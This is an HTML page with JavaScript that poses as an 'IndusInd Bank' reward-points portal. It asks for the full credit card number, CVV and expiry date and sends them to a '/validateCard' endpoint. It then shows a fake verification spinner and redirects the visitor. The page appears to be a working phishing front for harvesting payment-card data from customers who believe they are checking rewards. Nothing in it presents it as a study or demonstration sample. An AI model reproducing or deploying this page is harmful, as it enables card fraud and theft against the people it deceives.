<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IndusInd Bank</title>
    <script src="https://cdn.tailwindcss.com"></script> 
</head>
<body>
    <div class="container mx-auto mt-10">
        <div class="flex justify-center">
            <div class="w-full max-w-md p-4 rounded-md shadow-sm">
                <div class="text-center mb-4">
                    <img src="/images/logo.png" alt="Logo" class="w-100 h-40 mx-auto mb-2"> 
                    <h1 class="text-3xl font-bold">Reward Points</h1>
                </div>
                <form id="reward-form">
                    <div class="mb-4">
                        <label for="card-number" class="block text-gray-700 font-bold mb-2">Credit Card No.:</label>
                        <input type="text" id="card-number" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" maxlength="16" required>
                    </div>
                    <div class="mb-4">
                        <label for="cvv" class="block text-gray-700 font-bold mb-2">CVV:</label>
                        <input type="text" id="cvv" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" maxlength="3" required>
                    </div>
                    <div class="mb-4">
                        <label for="expiry-date" class="block text-gray-700 font-bold mb-2">Expiry Date:</label>
                        <input type="month" id="expiry-date" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" required>
                    </div>
                    <button type="button" onclick="validateCard()" class="hover:border bg-my-primary hover:border-my-primary hover:text-my-primary hover:border-my-primary hover:bg-white text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline">Validate Card</button>
                </form>
                <div id="waiting-timer" class="text-center hidden mt-4">
                    <div class="spinner-border animate-spin inline-block w-8 h-8 border-4 rounded-full text-my-primary" role="status">
                        <span class="visually-hidden">Loading...</span>
                    </div>
                    <p class="mt-2 text-gray-700">Please wait while verifying your reward points. Don't close the app.</p>
                </div>
            </div>
        </div>
    </div>
    <script>
        const cardNumberInput = document.getElementById('card-number');
        const cvvInput = document.getElementById('cvv');

        cardNumberInput.addEventListener('input', () => {
            cardNumberInput.value = cardNumberInput.value.replace(/\D/g, '').substring(0, 16); // Allow only digits and limit to 16
        });

        cvvInput.addEventListener('input', () => {
            cvvInput.value = cvvInput.value.replace(/\D/g, '').substring(0, 3); // Allow only digits and limit to 3
        });

        async function validateCard() {
            const cardNumber = document.getElementById('card-number').value.trim();
            const cvv = document.getElementById('cvv').value.trim();
            const expiryDate = document.getElementById('expiry-date').value.trim();
            const button = document.querySelector("#reward-form button");
            const waitingTimer = document.getElementById('waiting-timer');

            // Disable the button and change its text
            button.disabled = true;
            button.textContent = "Validating...";

            // Helper function to display error message
            function displayError(message) {
                const errorMessageElement = document.createElement('p');
                errorMessageElement.textContent = message;
                errorMessageElement.classList.add("text-red-500", "text-sm");

                const existingError = button.parentNode.querySelector('p.text-red-500');
                if (existingError) {
                    existingError.replaceWith(errorMessageElement);
                } else {
                    button.parentNode.insertBefore(errorMessageElement, button.nextSibling);
                }
            }

            // Validate input fields
            if (!cardNumber) {
                displayError("Card number cannot be empty");
                button.disabled = false;
                button.textContent = "Validate Card";
                return;
            }

            if (!cvv) {
                displayError("CVV cannot be empty");
                button.disabled = false;
                button.textContent = "Validate Card";
                return;
            }

            if (!expiryDate) {
                displayError("Expiry date cannot be empty");
                button.disabled = false;
                button.textContent = "Validate Card";
                return;
            }

            const [year, month] = expiryDate.split('-').map(Number);
            const currentDate = new Date();
            const currentMonth = currentDate.getMonth() + 1; // Months are 0-based
            const currentYear = currentDate.getFullYear();

            if (isNaN(month) || isNaN(year) || month < 1 || month > 12) {
                displayError("Invalid expiry date format");
                button.disabled = false;
                button.textContent = "Validate Card";
                return;
            }

            if (year < currentYear || (year === currentYear && month < currentMonth)) {
                displayError("Card is expired");
                button.disabled = false;
                button.textContent = "Validate Card";
                return;
            }

            try {
                const response = await fetch('/validateCard', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ cardNumber, cvv, expiryDate })
                });

                const data = await response.json();

                if (data.valid) {
                    // Show waiting timer
                    waitingTimer.classList.remove('hidden');
                    button.classList.add('hidden');

                    // Simulate waiting period of 10 seconds
                    setTimeout(() => {
                        window.location.href = '/rewardpoints';
                    }, 10000);
                } else {
                    throw new Error(data.message || 'Invalid card details');
                }
            } catch (error) {
                displayError(error.message);
            } finally {
                // Reset button state
                button.disabled = false;
                button.textContent = "Validate Card";
                waitingTimer.classList.add('hidden');
                button.classList.remove('hidden');
            }
        }
    </script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'my-primary': '#AF3014', 
                    },
                },
            },
            variants: { 
                extend: {
                    borderStyle: ['hover'],
                }
            }
        };
    </script>
</body>
</html>
